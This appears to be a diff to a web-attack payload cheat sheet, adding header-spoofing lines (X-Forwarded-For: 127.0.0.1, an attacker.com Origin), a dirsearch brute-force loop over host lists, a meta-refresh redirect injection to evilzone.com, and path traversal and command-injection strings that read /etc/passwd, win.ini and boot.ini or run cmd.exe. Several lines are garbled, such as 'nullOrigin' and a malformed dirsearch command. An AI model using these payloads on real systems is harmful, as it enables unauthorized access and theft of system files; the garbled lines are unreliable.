@@ -1,4 +1,21 @@
 
+  X-Forwarded-Host
+  X-Forwarded-Port
+  X-Forwarded-Scheme
+  Origin: 
+  nullOrigin: [siteDomain].attacker.com
+  X-Frame-Options: Allow
+  X-Forwarded-For: 127.0.0.1
+  X-Client-IP: 127.0.0.1
+  Client-IP: 127.0.0.1
+
+
+Fire
+ cat hosts | xargs -I@ sh -c 'python3 http://dirsearch.py -r -b -w path -u @ -e php,html,json,aspx' 
+Fire
+
+
+0;url=http:&#x2F;&#x2F;www.evilzone.com"HTTP-EQUIV="refresh"any=".arexport
 
 </CrIPT>
 %3C%2F%53C%72I%50%54%2F%3E
@@ -140,3 +157,11 @@ X-Forwarded-Host: 127.0.0.1
  ?continue={payload}
 
  ?return_path={payload}
+
+ \..\WINDOWS\win.ini
+..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+.?\.?\.?\etc\passwd
+../../boot.ini
+%0a/bin/cat%20/etc/passwd
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+..%c1%afetc%c1%afpasswd
